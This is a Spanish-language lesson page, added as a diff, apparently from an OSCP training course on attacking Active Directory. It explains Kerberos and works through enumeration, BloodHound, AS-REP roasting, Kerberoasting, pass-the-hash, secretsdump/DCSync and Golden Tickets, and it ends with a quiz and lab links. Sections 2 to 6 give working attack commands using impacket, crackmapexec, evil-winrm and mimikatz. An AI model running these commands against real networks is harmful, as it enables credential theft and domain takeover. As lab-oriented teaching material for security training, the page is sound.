@@ -1,0 +1,86 @@
+14 · Active Directory|Kerberos, enumeración con BloodHound, AS-REP roasting, Kerberoasting, pass-the-hash y movimiento lateral.
+<span class="badge oscp">Nivel 2 · Hacia OSCP</span>
+<h1>14 · Active Directory (AD)</h1>
+<p class="lead">AD es el corazón de casi toda empresa. El OSCP tiene un bloque entero de AD. Aquí ves cómo funciona y los ataques esenciales, explicados desde cero.</p>
+
+<h2>1. Conceptos básicos</h2>
+<div class="box def"><strong>📘 Vocabulario mínimo</strong>
+<b>Dominio</b>: grupo de equipos y usuarios gestionados juntos (CORP.LOCAL).<br>
+<b>Controlador de Dominio (DC)</b>: el servidor jefe; guarda todos los usuarios y contraseñas (NTDS.dit).<br>
+<b>Usuario de dominio</b>: cuenta que funciona en todos los equipos del dominio.<br>
+<b>Domain Admin</b>: el objetivo final; controla todo el dominio.<br>
+<b>Kerberos</b>: el sistema de “tickets” con el que te autenticas sin reenviar la contraseña.</div>
+<figure>
+<svg viewBox="0 0 760 240" role="img" aria-label="Kerberos: cliente, KDC, servicio con TGT y TGS">
+<rect x="20" y="90" width="150" height="70" rx="10" fill="#0f9d6e22" stroke="#0f9d6e"/><text x="95" y="130" text-anchor="middle" font-weight="800">👤 Usuario</text>
+<rect x="300" y="20" width="170" height="70" rx="10" fill="#2563eb22" stroke="#2563eb"/><text x="385" y="50" text-anchor="middle" font-weight="800">🏛️ KDC (DC)</text><text x="385" y="72" text-anchor="middle" font-size="11" class="muted">reparte tickets</text>
+<rect x="580" y="90" width="160" height="70" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="660" y="122" text-anchor="middle" font-weight="800">🖥️ Servicio</text><text x="660" y="142" text-anchor="middle" font-size="11" class="muted">(SQL, share...)</text>
+<line x1="150" y1="100" x2="310" y2="65" stroke="#888" stroke-width="2" class="flow"/><text x="230" y="70" font-size="11">1. pido TGT</text>
+<line x1="310" y1="85" x2="150" y2="120" stroke="#888" stroke-width="2"/><text x="230" y="110" font-size="11">2. TGT 🎫</text>
+<line x1="170" y1="140" x2="305" y2="85" stroke="#888" stroke-width="2" class="flow"/><text x="250" y="160" font-size="11">3. TGT→pido TGS</text>
+<line x1="460" y1="110" x2="580" y2="120" stroke="#888" stroke-width="2" class="flow"/><text x="520" y="105" font-size="11">4. TGS 🎫</text>
+<line x1="170" y1="130" x2="580" y2="130" stroke="#0f9d6e" stroke-width="2" stroke-dasharray="4 3"/><text x="380" y="195" text-anchor="middle" font-size="11" class="muted">5. presento el TGS al servicio y accedo</text>
+</svg>
+<figcaption>Kerberos en 5 pasos: pides un TGT al DC, con él pides un TGS para un servicio, y con el TGS entras.</figcaption></figure>
+
+<h2>2. Enumeración (necesitas unas credenciales de dominio)</h2>
+<pre><span class="c"># Usuarios, grupos, política de contraseñas</span>
+<span class="p">$</span> crackmapexec smb 10.0.2.5 -u bob -p 'Pass123' --users
+<span class="p">$</span> enum4linux-ng -A 10.0.2.5
+<span class="p">$</span> ldapsearch -x -H ldap://10.0.2.5 -b "dc=corp,dc=local"
+<span class="c"># rpcclient</span>
+<span class="p">$</span> rpcclient -U bob 10.0.2.5  →  enumdomusers, querygroupmem</pre>
+
+<h2>3. BloodHound (el mapa del dominio)</h2>
+<div class="box def"><strong>📘 ¿Qué es?</strong>Recoge datos del dominio y los dibuja como un grafo. Te muestra el <b>camino más corto</b> desde tu usuario hasta Domain Admin. Es casi imprescindible.</div>
+<pre><span class="c"># Recolectar datos desde Windows o Kali:</span>
+<span class="p">$</span> bloodhound-python -u bob -p 'Pass123' -d corp.local -ns 10.0.2.5 -c all
+<span class="c"># o SharpHound.exe en la víctima. Luego importas el .zip en la GUI de BloodHound.</span>
+<span class="c"># Consulta clave: "Shortest paths to Domain Admins"</span></pre>
+
+<h2>4. Ataques Kerberos (los que más caen)</h2>
+<h3>AS-REP Roasting</h3>
+<p>Usuarios con “no requiere pre-autenticación” permiten pedir un hash crackeable sin contraseña.</p>
+<pre><span class="p">$</span> impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.2.5
+<span class="p">$</span> hashcat -m 18200 asrep.hash rockyou.txt</pre>
+<h3>Kerberoasting</h3>
+<p>Cualquier usuario del dominio puede pedir tickets (TGS) de cuentas de servicio y crackearlos offline.</p>
+<pre><span class="p">$</span> impacket-GetUserSPNs corp.local/bob:Pass123 -dc-ip 10.0.2.5 -request
+<span class="p">$</span> hashcat -m 13100 kerberoast.hash rockyou.txt</pre>
+
+<h2>5. Movimiento lateral con credenciales/hash</h2>
+<pre><span class="c"># Con contraseña o con hash (pass-the-hash)</span>
+<span class="p">$</span> crackmapexec smb 10.0.2.0/24 -u admin -H &lt;hash&gt;         <span class="c"># ¿dónde soy admin?</span>
+<span class="p">$</span> impacket-psexec corp.local/admin@10.0.2.6 -hashes :&lt;hash&gt;
+<span class="p">$</span> impacket-wmiexec corp.local/admin@10.0.2.6
+<span class="p">$</span> evil-winrm -i 10.0.2.6 -u admin -H &lt;hash&gt;</pre>
+
+<h2>6. Volcar todo el dominio (si eres Domain Admin)</h2>
+<pre><span class="p">$</span> impacket-secretsdump corp.local/admin@10.0.2.5          <span class="c"># todos los hashes</span>
+<span class="c"># DCSync: pedir los hashes al DC como si fueras otro DC</span>
+mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt</pre>
+<div class="box danger"><strong>🗝️ Golden Ticket</strong>Con el hash de la cuenta <b>krbtgt</b> puedes fabricar tickets Kerberos para cualquier usuario y mantener acceso total. Es el “control absoluto” del dominio.</div>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP: flujo típico de AD</strong>1) Acceso inicial a un equipo del dominio (web, credenciales). 2) Enumerar con BloodHound/CME. 3) AS-REP/Kerberoast para más credenciales. 4) Movimiento lateral (PtH, psexec/winrm). 5) Escalar a Domain Admin. 6) secretsdump. Documenta cada salto con capturas.</div>
+
+<h2>🎥 Vídeos y práctica</h2>
+<div class="vlinks">
+<a href="https://www.youtube.com/results?search_query=active+directory+pentesting+espa%C3%B1ol+s4vitar" target="_blank" rel="noopener">AD pentesting (ES)</a>
+<a href="https://www.youtube.com/results?search_query=bloodhound+kerberoasting+tutorial" target="_blank" rel="noopener">BloodHound + Kerberoasting</a>
+<a href="https://tryhackme.com/module/hacking-active-directory" target="_blank" rel="noopener">TryHackMe AD</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 14 · Active Directory">
+[
+{"q":"¿Qué servidor guarda todas las credenciales del dominio?","o":["El router","El Controlador de Dominio (NTDS.dit)","Tu Kali","El switch"],"a":1,"e":"El DC, en la base NTDS.dit."},
+{"q":"¿Qué herramienta dibuja el camino hacia Domain Admin?","o":["Nmap","BloodHound","John","Hydra"],"a":1,"e":"BloodHound (datos con SharpHound/bloodhound-python)."},
+{"q":"Kerberoasting ataca…","o":["El kernel","Cuentas de servicio (SPN) para crackear su ticket offline","El firewall","La web"],"a":1,"e":"Pides el TGS de cuentas con SPN y lo crackeas (hashcat -m 13100)."},
+{"q":"AS-REP Roasting es posible cuando un usuario…","o":["Es admin","No requiere pre-autenticación Kerberos","Tiene MFA","Está deshabilitado"],"a":1,"e":"Sin pre-auth puedes pedir el AS-REP y crackearlo (-m 18200)."},
+{"q":"Pass-the-hash en AD permite…","o":["Descifrar Kerberos","Autenticarte en otros equipos usando el hash NTLM","Ver puertos","Nada"],"a":1,"e":"Te mueves lateralmente con el hash, sin la contraseña."},
+{"q":"¿Qué consigues con el hash de la cuenta krbtgt?","o":["Nada","Fabricar un Golden Ticket y controlar el dominio","Solo leer","Reiniciar el DC"],"a":1,"e":"Golden Ticket = control persistente del dominio."},
+{"q":"¿Qué herramienta de impacket vuelca todos los hashes del dominio?","o":["GetUserSPNs","secretsdump","psexec","wmiexec"],"a":1,"e":"secretsdump (incluye DCSync)."},
+{"q":"El TGT se pide a…","o":["El servicio","El KDC (Controlador de Dominio)","Otro usuario","El cliente"],"a":1,"e":"El KDC reparte el TGT y luego los TGS."}
+]
+</script>
+<div class="lab"><h4>🧪 Práctica</h4><p>En TryHackMe/HackTheBox monta o usa un laboratorio AD (salas "Attacktive Directory", "Vulnnet: Roasted"). Practica: enumerar usuarios, AS-REP roast, Kerberoast, crackear, pass-the-hash y secretsdump.</p></div>
